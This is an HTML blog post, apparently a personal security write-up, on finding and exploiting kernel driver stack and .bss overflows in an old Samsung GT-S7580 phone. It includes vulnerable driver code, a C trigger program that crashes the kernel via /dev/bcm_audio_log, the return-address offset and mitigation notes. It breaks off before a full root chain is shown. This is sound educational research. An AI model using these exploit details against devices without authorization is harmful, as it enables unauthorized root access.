@@ -1,0 +1,465 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta name=generator content="Hugo 0.92.2">
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=author content="cavefxa">
+<meta property="og:url" content="https://cavefxa.com/posts/gt-s7580-zero-to-root/">
+<link rel=canonical href=https://cavefxa.com/posts/gt-s7580-zero-to-root/><link rel=alternate type=application/atom+xml href=https://cavefxa.comindex.xml title=cavefxa>
+<script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/cavefxa.com"},"articleSection":"posts","name":"Samsung GT-S7580 - Zero to Root!","headline":"Samsung GT-S7580 - Zero to Root!","description":"Preface This blog post, will be discussing how I did vulnerability research on an older Samsung phone (GT-S7580) - specifically the model GT-S7580. I had not done ARM exploitation, rooting, and barely even any kernel exploitation before this. I will go through what I ended up learning and how I went from zero to root.\nGetting started Connecting to the phone Connecting to the phone in some way is crucial otherwise how will you interface with the phone?","inLanguage":"en-US","author":"cavefxa","creator":"cavefxa","publisher":"cavefxa","accountablePerson":"cavefxa","copyrightHolder":"cavefxa","copyrightYear":"2023","datePublished":"2023-05-29 15:33:45 \u002b0200 CEST","dateModified":"2023-05-29 15:33:45 \u002b0200 CEST","url":"https:\/\/cavefxa.com\/posts\/gt-s7580-zero-to-root\/","keywords":[]}</script>
+<title>Samsung GT-S7580 - Zero to Root!</title>
+<meta property="og:title" content="Samsung GT-S7580 - Zero to Root!">
+<meta property="og:type" content="article">
+<meta property="og:description" content="Preface This blog post, will be discussing how I did vulnerability research on an older Samsung phone (GT-S7580) - specifically the model GT-S7580. I had not done ARM exploitation, rooting, and barely even any kernel exploitation before this. I will go through what I ended up learning and how I went from zero to root.
+Getting started Connecting to the phone Connecting to the phone in some way is crucial otherwise how will you interface with the phone?">
+<meta name=description content="Preface This blog post, will be discussing how I did vulnerability research on an older Samsung phone (GT-S7580) - specifically the model GT-S7580. I had not done ARM exploitation, rooting, and barely even any kernel exploitation before this. I will go through what I ended up learning and how I went from zero to root.
+Getting started Connecting to the phone Connecting to the phone in some way is crucial otherwise how will you interface with the phone?">
+<meta property="og:locale" content="en-us"><meta property="og:image" content>
+<style>body{font-family:bree serif,sans-serif;-webkit-font-smoothing:antialiased;margin:0 20px}article{max-width:900px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none}a:hover{font-weight:600;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:18px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#000}.markdown-body blockquote{margin:0;padding:0 1em;color:#57606a;border-left:.25em solid #d0d7de}.markdown-body pre{padding:16px;overflow:auto;border-radius:10px}pre{.l { color: #000000 !important; }}.markdown-body code{padding:.2em .4em;font-size:85%;color:#43494d;border-radius:6px}.highlight pre{background-color:#fff!important}.markdown-body pre>code{padding:0;font-size:100%;color:#171b1f;background-color:inherit;border:0}.Chinese .markdown-body{line-height:200%}.site-date-catalog{font-size:2rem}.header-title{font-size:2rem;font-weight:700;margin-top:32px;font-family:bungee shade,sans-serif}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:600}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px}.site-footer-item{margin-right:12px}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){.header-title,.header-subtitle,.header-items{text-align:center}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}}@media screen and (max-width:48em){.posts-category{display:none}}</style>
+<style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pack:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+<link href=/index.xml rel=alternate type=application/rss+xml title=cavefxa>
+<link rel=preconnect href=https://fonts.gstatic.com>
+<link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel=stylesheet>
+</head>
+<body>
+<article class=post id=article>
+<div class=row>
+<div class=col-xs-12>
+<div class=site-header>
+<header>
+<div class=header-title>
+<a href=/>cavefxa</a>
+</div>
+<div class=header-subtitle></div>
+</header>
+<div class="row end-md center-xs header-items">
+<div class=header-item>
+<a href=/index.xml target=_blank>RSS</a>
+</div>
+</div>
+<div class="row end-xs">
+</div>
+<div class=header-line></div>
+</div>
+<header class=post-header>
+<h1 class=post-title>Samsung GT-S7580 - Zero to Root!</h1>
+<div class="row post-desc">
+<div class=col-xs-6>
+<time class=post-date datetime="2023-05-29 15:33:45 CEST">
+29 May 2023
+</time>
+</div>
+<div class=col-xs-6>
+<div class=post-author>
+<a target=_blank href=https://cavefxa.com/>@cavefxa</a>
+</div>
+</div>
+</div>
+</header>
+<div class="post-content markdown-body">
+<h1 id=preface>Preface</h1>
+<p>This blog post, will be discussing how I did vulnerability research on an older Samsung phone (GT-S7580) - specifically the model GT-S7580. I had not done ARM exploitation, rooting, and barely even any kernel exploitation before this. I will go through what I ended up learning and how I went from zero to root.</p>
+<p><img src=/pictures/samsung-phone.png alt="samsung phone"></p>
+<h1 id=getting-started>Getting started</h1>
+<h3 id=connecting-to-the-phone>Connecting to the phone</h3>
+<p>Connecting to the phone in some way is crucial otherwise how will you interface with the phone? We would like a clean setup, so our work process is as streamlined as possible. We will be using the &ldquo;Android Debugging Bridge&rdquo; or ADB for short. ADB will allow us to get a shell on the device, which is pretty neat. To connect to the phone with ADB we will first need to enable Developer Mode. We do this by following the steps below:</p>
+<ol>
+<li>Go into &ldquo;Settings&rdquo;</li>
+<li>From Settings go into &ldquo;About Device&rdquo;</li>
+<li>Click repeatedly on &ldquo;Build Number&rdquo; until in developer mode</li>
+</ol>
+<p>This might vary from model to model, but the methodology described above is pretty common practice. From here we will go to &ldquo;Settings > Developer Settings&rdquo; and enable USB debugging, such that <code>adb</code> will work. After we&rsquo;ve done this, we connect a USB to the phone, and we will be able to run <code>adb</code> on our host machine, and have a shell.</p>
+<pre tabindex=0><code>(our pc)
+$ adb shell
+
+(our phone)
+# ls
+acct
+cache
+charger
+config
+data
+dev
+...
+</code></pre><h3 id=getting-source-code>Getting source code</h3>
+<p>Luckily a lot of Samsung firmware is actually open source. Now, it&rsquo;s not a given that our specific model is listed over at <a href=https://opensource.samsung.com/>https://opensource.samsung.com/</a>. But we see that it is:</p>
+<p><img src=/pictures/samsung_source.png alt="samsung source">
+Now we&rsquo;ll need to analyze the source code, or begin fuzzing. The real fun stuff begins here.</p>
+<h1 id=finding-bugs>Finding bugs</h1>
+<h3 id=bug-1>Bug 1</h3>
+<p>I had read a blog post about writing dumb fuzzers that would open files in <code>/dev/</code>, that were writable, and just write a bunch of garbage to all char device drivers trying to find crashes. This was initially what I intended on doing. However I ended up going the manual route first, to see if I could find any vulnerabilities before fuzzing. I looked for writable files in <code>/dev/</code> and looked for the respective source code. After about 10 minutes I had found the first bug:</p>
+<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:green>// drivers/char/broadcom/modem/vsp/fuse_vsp.c
+</span><span style=color:green></span>
+	<span style=color:#00f>if</span> (copy_from_user(sSendTempBuf, buf, size) != 0) {
+		VSP_DEBUG(DBG_ERROR, <span style=color:#a31515>&#34;vsp: copy_from_user is fail</span><span style=color:#a31515>\n</span><span style=color:#a31515>&#34;</span>);
+		<span style=color:#00f>return</span> 0;
+	}
+</code></pre></div><p>In one of the file operations on the <code>fuse_vsp</code> driver, there was a <code>copy_from_user</code> into a buffer in the kernel, of a user defined size. For this to be exploitable we would need to figure out what the size of this <code>sSendTempBuf</code> is.</p>
+<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#00f>#define CSD_BUFFER_SIZE  2048
+</span><span style=color:#00f></span>
+<span style=color:green>/* During VT connect, CP will send 80 bytes twice every 20 msec to AP */</span>
+<span style=color:#00f>#define CSD_DOWNLINK_DATA_LEN  80
+</span><span style=color:#00f></span><span style=color:#00f>static</span> UInt8 stempBuf[CSD_BUFFER_SIZE];
+<span style=color:#00f>static</span> UInt8 sSendTempBuf[CSD_BUFFER_SIZE];
+</code></pre></div><p>We see that it&rsquo;s indeed a simple overflow. This is an overflow in the <code>.bss</code> region, and while definitely a vulnerability, it wasn&rsquo;t immediately obvious how to exploit it. So I went on looking for another bug.</p>
+<h3 id=bug-2>Bug 2</h3>
+<p>Using the same methodology as above, I ended up finding another bug. This one even more obvious.</p>
+<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#00f>static</span> ssize_t
+BCMAudLOG_write(<span style=color:#00f>struct</span> file *file, <span style=color:#00f>const</span> <span style=color:#2b91af>char</span> __user *buf,
+						size_t count, loff_t *ppos)
+{
+	<span style=color:#2b91af>int</span> number;
+	<span style=color:#2b91af>char</span> buffer[642];
+
+	number = copy_from_user(buffer, buf, count);
+	<span style=color:#00f>if</span> (number != 0)
+		aTrace(LOG_ALSA_INTERFACE,
+		<span style=color:#a31515>&#34;</span><span style=color:#a31515>\n</span><span style=color:#a31515> %s : only copied %d bytes from user</span><span style=color:#a31515>\n</span><span style=color:#a31515>&#34;</span>,
+		__func__, count - number);
+
+	count--;
+	CSL_LOG_Write(buffer[0], logpoint_buffer_idx, &amp;buffer[1], count);
+
+	<span style=color:#00f>return</span> count;
+}
+</code></pre></div><p>We will write from our <code>buf</code> into the kernel stack buffer <code>buffer</code>, which has a fixed size of 642, and we get to define how much we write. This seems like a good vulnerability to try and exploit. So that&rsquo;s what I tried to do</p>
+<h1 id=exploitation>Exploitation</h1>
+<h3 id=preparation>Preparation</h3>
+<p>Before we begin writing an exploit, we will check the mitigations on the system. We don&rsquo;t currently have a leak, so it&rsquo;s quite important that we don&rsquo;t have protections that randomize addresses on. We start by disabling <code>kptr_restrict</code>, so that we can read from <code>/proc/kallsyms</code>.</p>
+<pre tabindex=0><code>$ echo 0 &gt; /proc/sys/kernel/kptr_restrict
+</code></pre><p>I noticed that on different system reboots the addresses would not change. This would indicate that KALSR is not on. This really makes our life a lot easier, we don&rsquo;t need to worry about leaks now. It would seem it&rsquo;s just a regular kernel ROP now. However there&rsquo;s the one issue that we don&rsquo;t have <code>gdb</code> on the device, and getting it would probably be pretty difficult, so let&rsquo;s do it blind! We will also check for other protection mechanisms. Looking in <code>/proc/cpuinfo</code> it would seem that there&rsquo;s no SMEP either. Generally it would seem that there&rsquo;s no real protections. In the kernel config we see that there&rsquo;s a few interesting Samsung specific protections though:
+<img src=/pictures/samsung-anti-rooting.png alt="anti rooting samsung"></p>
+<p>This will be relevant later, as this was something I was getting <em>mildly</em> annoyed over.</p>
+<h3 id=jumping-in---exploit-fire>Jumping in - Exploit fire</h3>
+<p>Before trying to write a full fledged exploit for this bug, we want to see if we can trigger it. The bug is in the BCM Audio Log driver, and should be accessible at <code>/dev/bcm_audio_log</code>, and we&rsquo;re lucky that it is. Now the million dollar question, is how do we write C code on this system, such that it runs? Just use a cross-compiler? But what about the lack of GLIBC? We will be using the <code>musl</code> toolchain, and build the binaries statically such that they don&rsquo;t depend on external libraries. However for us to pick a specific toolchain we need to have information about the devices chipset. A quick google search reveals that it uses the Broadcom BCM21664. BCM21664 is a mobile processor with 2 ARM Cortex-A9 cores, that uses the ARMv7-A 32-bit instruction set. We will look for a toolchain that fulfills these requirements. I ended up just testing one by one, because there were not that many. I ended up using <code>toolchain/musl/armv7r-linux-musleabihf-cross/bin/armv7r-linux-musleabihf-gcc</code> for compiling binaries pre-transfer, and this seemed to work flawlessly. I made a small bash script for pushing files and running them immediately:</p>
+<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>toolchain/musl/armv7r-linux-musleabihf-cross/bin/armv7r-linux-musleabihf-gcc $1 -o exploit -static
+
+adb push exploit /data/local/tmp/exploit
+adb shell <span style=color:#a31515>&#34;chmod 755 /data/local/tmp/exploit&#34;</span>
+adb shell <span style=color:#a31515>&#34;/data/local/tmp/exploit&#34;</span>
+</code></pre></div><p>In the start it seemed like we had to write our exploit to <code>/data/local/tmp/exploit</code> as we couldn&rsquo;t put our exploit anywhere else. Now we&rsquo;re ready for the exploit fire:</p>
+<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>...
+
+<span style=color:#2b91af>int</span> fd;
+
+<span style=color:#2b91af>void</span> fire() {
+    <span style=color:#2b91af>uint32_t</span> payload[200] = {0};
+    
+	<span style=color:#00f>for</span> (<span style=color:#2b91af>int</span> i = 0; i &lt; 200; i++) {
+	    payload[i] = (<span style=color:#2b91af>uint32_t</span>)0xdeadbeef;
+	}
+
+    <span style=color:green>// stack go boom boom!
+</span><span style=color:green></span>    write(fd, payload, <span style=color:#00f>sizeof</span>(payload));
+}
+
+<span style=color:#2b91af>int</span> main() {
+    printf(<span style=color:#a31515>&#34;now opening bcm_audio_log</span><span style=color:#a31515>\n</span><span style=color:#a31515>&#34;</span>);
+    
+    fd = open(<span style=color:#a31515>&#34;/dev/bcm_audio_log&#34;</span>, O_WRONLY);
+    fire();
+}
+</code></pre></div><p>And suddenly the phone reboots. We&rsquo;ve caused a kernel panic!</p>
+<h3 id=getting-code-execution>Getting code execution</h3>
+<p>The first thing we want is to find the offset to the return address so that we know that we&rsquo;re actually able to diverge the control flow to something we want, i.e. a rop-chain. After a while I had found the offset to be exactly 646 bytes. Now I wanted to do a simple <code>printk</code> proof of concept. This proved more difficult and ended up being the thing that took me the longest in the entire project. The reason? I had used the wrong address for printk for so long, that I didn&rsquo;t even consider, that this could&rsquo;ve been the issue with my exploit. After figuring this out I finally had code execution. Now how do we pop a shell?</p>
+<h3 id=popping-a-shell>Popping a shell</h3>
+<p>We have a few options available now. To name two:</p>
+<ol>
+<li>Trying to write a ROP-chain that would get us shell</li>
+<li>Trying ARM shellcode since there&rsquo;s no SMEP</li>
+</ol>
+<p>We need to know that we cannot just return to userland code which calls system calls, directly from the kernel, due to the fact that system calls are just interfaces with the kernel. The kernel doesn&rsquo;t know what an execve syscall is per say. With &ldquo;normal&rdquo; x86_64 kernel exploitation, we would often use the <code>swapgs</code> instruction to change the <code>gs</code> flag. This involves saving the statem returning, and setting up the state again. Saving the state could look something like this:</p>
+<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#2b91af>void</span> save_state(){
+    __asm__(
+        <span style=color:#a31515>&#34;.intel_syntax noprefix;&#34;</span>
+        <span style=color:#a31515>&#34;mov user_cs, cs;&#34;</span>
+        <span style=color:#a31515>&#34;mov user_ss, ss;&#34;</span>
+        <span style=color:#a31515>&#34;mov user_sp, rsp;&#34;</span>
+        <span style=color:#a31515>&#34;pushf;&#34;</span>
+        <span style=color:#a31515>&#34;pop user_rflags;&#34;</span>
+        <span style=color:#a31515>&#34;.att_syntax;&#34;</span>
+    );
+    puts(<span style=color:#a31515>&#34;[*] Saved state&#34;</span>);
+}
